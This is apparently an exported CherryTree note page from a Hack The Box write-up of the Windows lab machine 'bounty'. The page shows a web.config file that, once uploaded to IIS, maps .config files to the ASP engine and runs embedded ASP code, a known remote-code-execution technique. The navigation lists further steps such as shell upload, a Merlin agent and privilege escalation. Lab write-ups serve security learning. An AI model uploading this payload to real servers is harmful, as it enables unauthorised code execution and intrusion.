<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>web.config for RCE</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><div class="main"><div class="tree">
<p><a href="../HacktheBox--Windows_Boxes.html">Windows Boxes</a></p>
<p><a href="HacktheBox--Windows_Boxes--bounty.html">bounty</a></p>

<ol>
<li><a href="HacktheBox--Windows_Boxes--bounty--nmap.html">nmap</a></li>
<li><a href="HacktheBox--Windows_Boxes--bounty--http.html">http</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--bounty--http--gobuster.html">gobuster</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--bounty--http--gobuster--transfer.aspx.html">transfer.aspx</a></li>
</ol>
</ol>
<li><a href="HacktheBox--Windows_Boxes--bounty--file_extension_spraying_with_burpsuite's_intruder.html">file extension spraying with burpsuite's intruder</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--bounty--file_extension_spraying_with_burpsuite's_intruder--intruder_extension_bruteforce.html">intruder extension bruteforce</a></li>
</ol>
<li><a href="HacktheBox--Windows_Boxes--bounty--web.config_for_RCE.html">web.config for RCE</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--bounty--web.config_for_RCE--upload_web.config.html">upload web.config</a></li>
</ol>
<li><a href="HacktheBox--Windows_Boxes--bounty--simple_aspx_command.html">simple aspx command</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--bounty--simple_aspx_command--burp.html">burp</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--bounty--simple_aspx_command--burp--swap_in_shells.aspx.html">swap in shells.aspx</a></li>
<li><a href="HacktheBox--Windows_Boxes--bounty--simple_aspx_command--burp--ping_myself.html">ping myself</a></li>
</ol>
</ol>
<li><a href="HacktheBox--Windows_Boxes--bounty--root_through_MERLIN.html">root through MERLIN</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--bounty--root_through_MERLIN--merlin_dl.html">merlin dl</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--bounty--root_through_MERLIN--merlin_dl--create_x509_cert.html">create x509 cert</a></li>
<li><a href="HacktheBox--Windows_Boxes--bounty--root_through_MERLIN--merlin_dl--run_merlin.html">run merlin</a></li>
<li><a href="HacktheBox--Windows_Boxes--bounty--root_through_MERLIN--merlin_dl--compile_merlin_agent.html">compile merlin agent</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--bounty--root_through_MERLIN--merlin_dl--compile_merlin_agent--default_agent_w-o_params_builds_for_linux.html">default agent w/o params builds for linux</a></li>
</ol>
<li><a href="HacktheBox--Windows_Boxes--bounty--root_through_MERLIN--merlin_dl--upload_agent.exe_to_victim.html">upload agent.exe to victim</a></li>
<li><a href="HacktheBox--Windows_Boxes--bounty--root_through_MERLIN--merlin_dl--if_you_need_to_kill_merlin.html">if you need to kill merlin:</a></li>
<li><a href="HacktheBox--Windows_Boxes--bounty--root_through_MERLIN--merlin_dl--certutil_agent.html">certutil agent</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--bounty--root_through_MERLIN--merlin_dl--certutil_agent--run_agent.html">run agent</a></li>
</ol>
</ol>
<li><a href="HacktheBox--Windows_Boxes--bounty--root_through_MERLIN--merlin.html">merlin</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--bounty--root_through_MERLIN--merlin--info.html">info</a></li>
<li><a href="HacktheBox--Windows_Boxes--bounty--root_through_MERLIN--merlin--powerup.html">powerup</a></li>
<li><a href="HacktheBox--Windows_Boxes--bounty--root_through_MERLIN--merlin--whoami_priv.html">whoami priv</a></li>
</ol>
<li><a href="HacktheBox--Windows_Boxes--bounty--root_through_MERLIN--juicy_potato.html">juicy potato</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--bounty--root_through_MERLIN--juicy_potato--upload_with_merlin.html">upload with merlin</a></li>
</ol>
</ol>
<li><a href="HacktheBox--Windows_Boxes--bounty--root_through_ms15-051_and_NC.html">root through ms15-051 and NC</a></li>
<ol>
<li><a href="HacktheBox--Windows_Boxes--bounty--root_through_ms15-051_and_NC--msf_port_listener.html">msf port listener</a></li>
<li><a href="HacktheBox--Windows_Boxes--bounty--root_through_ms15-051_and_NC--upload_file.html">upload file</a></li>
<li><a href="HacktheBox--Windows_Boxes--bounty--root_through_ms15-051_and_NC--upload_ms015-051_and_NC64.exe.html">upload ms015-051 and NC64.exe</a></li>
<li><a href="HacktheBox--Windows_Boxes--bounty--root_through_ms15-051_and_NC--privesc.html">privesc</a></li>
</ol>
<li><a href="HacktheBox--Windows_Boxes--bounty--usr-root.html">usr/root</a></li>
<li><a href="HacktheBox--Windows_Boxes--bounty--Lessons_Learned.html">Lessons Learned</a></li>
</ol></div>
<div class="page"><h1><b><u>web.config for RCE</u></b></h1><a href="https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/">https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/</a><br /><img src="images/275-1.png" alt="images/275-1.png" /><br /><br /><span style="color:#ffa500;">&lt;?xml version="1.0" encoding="UTF-8"?&gt;<br />&lt;configuration&gt;<br />   &lt;system.webServer&gt;<br />      &lt;handlers accessPolicy="Read, Script, Write"&gt;<br />         &lt;add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" /&gt;        <br />      &lt;/handlers&gt;<br />      &lt;security&gt;<br />         &lt;requestFiltering&gt;<br />            &lt;fileExtensions&gt;<br />               &lt;remove fileExtension=".config" /&gt;<br />            &lt;/fileExtensions&gt;<br />            &lt;hiddenSegments&gt;<br />               &lt;remove segment="web.config" /&gt;<br />            &lt;/hiddenSegments&gt;<br />         &lt;/requestFiltering&gt;<br />      &lt;/security&gt;<br />   &lt;/system.webServer&gt;<br />&lt;/configuration&gt;<br />&lt;!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!<br />&lt;%<br />Response.write("-"&amp;"-&gt;")<br />' it is running the ASP code if you can see 3 by opening the web.config file!<br />Response.write(1+2)<br />Response.write("&lt;!-"&amp;"-")<br />%&gt;<br />--&gt;</span><br /></div></div>
</body></html>